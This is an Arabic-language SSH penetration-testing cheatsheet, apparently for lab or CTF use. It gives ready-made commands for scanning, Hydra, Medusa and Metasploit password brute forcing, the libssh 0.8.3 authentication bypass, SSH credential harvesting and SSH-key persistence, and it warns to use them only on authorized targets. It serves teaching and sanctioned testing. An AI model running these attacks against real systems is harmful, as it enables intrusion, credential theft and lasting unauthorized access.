1. Reconnaissance

تأكد من عنوانك والهدف قبل الفحص، خصوصًا داخل VPN/Lab.

معرفة IP الخاص فيك KALI TERMINAL
ip a # أو ifconfig
في لابات VPN غالبًا عنوان المهاجم يكون على tun0.
اختبار الوصول للهدف KALI TERMINAL
ping -c 4 [TARGET]
✓ إذا رد الهدف: packets received / 0% packet loss
ابدأ بفحص الوصول قبل Nmap عند الحاجة.

2. Port Scanning

حدد وجود SSH والإصدار قبل أي تخمين أو استغلال.

الفحص الأساسي + الإصدار KALI TERMINAL
nmap -sS -sV [TARGET]
✓ مثال Output: 22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99)
فحص جميع TCP ports إذا لم يظهر 22 KALI TERMINAL
nmap -p- --min-rate=1000 -T4 [TARGET]
إذا ظهر SSH على بورت غير قياسي، أكمل كل أوامر الملف باستخدام -p [PORT] أو خيار البورت الخاص بالأداة.
فحص مركّز على SSH KALI TERMINAL
nmap -p22 -sV -sC [TARGET]
شغّل Version Detection قبل وحدات Metasploit حتى تختار المسار المطابق.

3. Enumeration

اسحب الـbanner، الإصدار، الخوارزميات، المفاتيح وطرق المصادقة قبل الانتقال للـcredentials.

Banner / Version

Banner يدوي عبر Netcat KALI TERMINAL
nc [TARGET] 22
مفيد لمعرفة OpenSSH/libssh/version بدون تسجيل دخول.
Metasploit Version Scanner MSFCONSOLE
use auxiliary/scanner/ssh/ssh_version set RHOSTS [TARGET] run
✓ مثال Output: OpenSSH 7.9p1

Nmap NSE

الخوارزميات المدعومة KALI TERMINAL
nmap -p22 --script ssh2-enum-algos [TARGET]
يعرض Key Exchange / Ciphers / MACs / Compression المدعومة من الخادم.
SSH Host Key / Fingerprint KALI TERMINAL
nmap -p22 --script ssh-hostkey --script-args ssh_hostkey=full [TARGET]
طرق المصادقة لمستخدم معروف KALI TERMINAL
nmap -p22 --script ssh-auth-methods --script-args="ssh.user=[USERNAME]" [TARGET]
يفيد لمعرفة هل الخادم يسمح Password / Public Key / none وغيرها.
SSH brute عبر Nmap NSE KALI TERMINAL
nmap -p22 --script ssh-brute --script-args userdb=[USERLIST] [TARGET]
طريقة بديلة موجودة في ملاحظات SSH؛ استخدمها فقط على الهدف المصرّح لك اختباره.
تنفيذ أمر عبر Nmap بعد معرفة Credentials KALI TERMINAL
nmap -p22 --script ssh-run --script-args="ssh-run.cmd=[COMMAND],ssh-run.username=[USERNAME],ssh-run.password=[PASSWORD]" [TARGET]
موجود في ملاحظات Enumeration؛ استخدمه فقط بعد وجود بيانات دخول صالحة، وليس كبديل للـlogin العادي.

الاتصال بسيرفر SSH قديم

إذا رفض العميل الحديث خوارزمية Key Exchange SSH CLIENT
ssh [USERNAME]@[TARGET] -o KexAlgorithms=+diffie-hellman-group1-sha1
مثال خطأ: no matching key exchange method found
إذا ظهر خطأ Host Key Type SSH CLIENT
ssh [USERNAME]@[TARGET] -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa
مثال خطأ: no matching host key type found — Their offer: ssh-rsa,ssh-dss
إذا رفض Cipher قديم SSH CLIENT
ssh [USERNAME]@[TARGET] -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa -c aes128-cbc
✓ بعد توافق الخوارزميات قد يظهر prompt تأكيد الـfingerprint ثم طلب كلمة المرور.
مهم: خيارات الخوارزميات القديمة استخدمها فقط عند التعامل مع نظام Legacy معروف وفي بيئة مصرح بها؛ لا تجعلها إعدادًا دائمًا لعميل SSH.

4. Credential Testing

إذا احتجت اختبار كلمات المرور، ابدأ بقائمة صغيرة ومستخدم معروف، ثم وسّع فقط عند الحاجة.

Hydra

مستخدم واحد + قائمة كلمات مرور KALI TERMINAL
hydra -l [USERNAME] -P [WORDLIST] ssh://[TARGET]:22 -t 4 -V
-t 4 يحدد عدد الـtasks و-V يعرض المحاولات. من القوائم الموجودة في البيئة: /usr/share/wordlists/metasploit/root_userpass.txt وunix_passwords.txt.
صيغة Hydra المختصرة KALI TERMINAL
hydra -l [USERNAME] -P [WORDLIST] [TARGET] ssh

Medusa — بديل إذا Hydra واجه مشكلة

اختبار SSH عبر Medusa KALI TERMINAL
medusa -h [TARGET] -u [USERNAME] -P [WORDLIST] -M ssh
استخدم Medusa كبديل عندما لم تعمل Hydra بشكل جيد مع السيرفر القديم.

Metasploit — ssh_login

User/Password dictionaries MSFCONSOLE
use auxiliary/scanner/ssh/ssh_login set RHOSTS [TARGET] set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt set STOP_ON_SUCCESS true set VERBOSE true run
✓ مثال نجاح بصيغة placeholders: Success: '[USERNAME]:[PASSWORD]' — SSH session opened
اللاب استخدم نفس الـmodule مع قوائم common_users.txt وcommon_passwords.txt.
مستخدم واحد + قائمة كلمات مرور MSFCONSOLE
use auxiliary/scanner/ssh/ssh_login set RHOSTS [TARGET] set USERNAME [USERNAME] set PASS_FILE [WORDLIST] set THREADS 10 set VERBOSE true run
خفّض THREADS إذا كنت تحتاج اختبارًا أقل ضوضاء.

5. Access & Version-Specific Exploitation

تحذير: تأكد من الإصدار ونظام التشغيل والشروط المسبقة قبل أي exploit.

الدخول بالمفاتيح أو الاعتمادات، وأي استغلال مرتبط بالإصدار إذا كان التطابق واضحًا.

الدخول باسم مستخدم وكلمة مرور SSH CLIENT
ssh [USERNAME]@[TARGET] # بورت غير قياسي: ssh -p [PORT] [USERNAME]@[TARGET]
✓ أول اتصال قد يظهر: Are you sure you want to continue connecting (yes/no/[fingerprint])?
الدخول باستخدام Private Key KALI TERMINAL
chmod 0400 [PRIVATE_KEY] ssh -i [PRIVATE_KEY] [USERNAME]@[TARGET]
id_rsa اسم شائع لمفتاح خاص وauthorized_keys قائمة المفاتيح العامة المسموح لها بالدخول.
البحث المحلي عن exploits بعد معرفة الإصدار KALI TERMINAL
searchsploit [SSH_PRODUCT] [VERSION]
ابحث حسب المنتج/الإصدار بدل تشغيل exploit عشوائي.

libssh Authentication Bypass LINUX

libssh 0.8.3 Authentication Bypass MSFCONSOLE
use auxiliary/scanner/ssh/libssh_auth_bypass set RHOSTS [TARGET] set RPORT [PORT] set SPAWN_PTY true run
هذا المسار خاص بـlibssh 0.8.3. تأكد أن المنتج هو libssh فعلًا، وليس OpenSSH، وأن الإصدار/الشروط متطابقة.
تحذير: لا تعتبر وجود بورت 22 وحده دليلًا على قابلية الاستغلال. تأكد من Product + Version + OS + Preconditions أولًا. OpenSSH وlibssh منتجات مختلفة.

6. Post-Exploitation

Boundary: احتفظ هنا بـSSH keys/login/tunneling/SSH credential collection فقط. للتوسع استخدم Privilege_Escalation_Cheatsheet.html وCredential_Access_Cheatsheet.html وPivoting_Cheatsheet.html الموجودة في المكتبة.

خطوات فورية بعد الوصول فقط: تحقق من الهوية والصلاحيات، وسجّل مفاتيح SSH المهمة بدون تكرار مواضيع Post-Exploitation العامة.

Linux SSH Session LINUX

تأكيد المستخدم والنظام VICTIM SHELL
whoami id hostname uname -a pwd
فحص سريع للصلاحيات VICTIM SHELL
sudo -l
مشاهدة آخر SSH logins VICTIM SHELL
lastlog
مذكور في Linux enumeration كمعلومة مفيدة لتتبع جلسات المستخدمين السابقة.

جلسة خرجت من Metasploit ssh_login

عرض الجلسات والدخول عليها MSFCONSOLE
sessions sessions -i [SESSION_ID]
بعد نجاح ssh_login ادخل للجلسة وتحقق من الهدف المطلوب في اللاب.
مثال Lab: البحث عن Flag VICTIM SHELL
find / -name "flag" 2>/dev/null cat /flag
✓ اللاب أكد أن جلسة SSH الناتجة تسمح بتنفيذ أوامر النظام وقراءة الملف بعد العثور عليه.
جمع SSH credentials عبر Metasploit Post Module MSFCONSOLE
use post/multi/gather/ssh_creds set SESSION [SESSION_ID] run
هذا الـmodule مذكور مباشرة في ملاحظات Linux credential dumping.
إعادة استخدام مفتاح خاص مكتشف KALI TERMINAL
chmod 0400 [PRIVATE_KEY] ssh -i [PRIVATE_KEY] [USERNAME]@[TARGET]
SSH Key Persistence MSFCONSOLE
use post/linux/manage/sshkey_persistence set SESSION [SESSION_ID] set CREATESSHFOLDER true run
هذا المسار يحتاج صلاحيات مرتفعة. بعد حفظ المفتاح من Loot: chmod 0400 [PRIVATE_KEY] ثم استخدم ssh -i.
ملف SSH هذا يحتفظ فقط بالجزء المرتبط مباشرة بالخدمة. للتوسع في Credential Access وPost-Exploitation استخدم Credential_Access_Cheatsheet.html وLinux_Post_Exploitation_Cheatsheet.html الموجودين في المكتبة.
إذا احتجت SSH tunneling أو pivoting، انتقل إلى Pivoting_Cheatsheet.html بدل تكرار التفاصيل هنا.
